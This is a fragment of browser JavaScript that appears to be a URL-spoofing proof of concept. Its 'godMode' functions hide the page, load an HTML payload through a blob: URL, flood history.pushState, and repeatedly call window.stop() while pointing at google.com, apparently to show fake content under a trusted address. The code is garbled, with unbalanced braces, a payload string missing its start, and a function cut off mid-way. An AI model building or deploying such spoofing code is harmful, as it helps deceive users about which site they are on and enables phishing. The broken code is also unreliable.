    <script>
        const target = "https://www.google.com/";

        function setupSpoof() {
            document.querySelector('h2').style.display = 'none';
            document.querySelectorAll('button').forEach(b => b.style.display = 'none');
            document.getElementById('spoof-area').style.display = 'block';

        function godMode1() {
            setupSpoof();

                    }, 5);
                <\/script>
            `;
            const blob = new Blob([payload], { type: 'text/html' });
            window.location.href = URL.createObjectURL(blob);
        }
        function godMode2() {
            setupSpoof();
            window.location.href = target;

            for (let i = 0; i < 20; i++) {
                history.pushState(null, null, "#step" + i);

        }
        function godMode3() {
            setupSpoof();
            window.location.href = target;

            let count = 0;
            const burst = setInterval(() => {
                window.stop();
                count++;
                if (count > 500) clearInterval(burst);
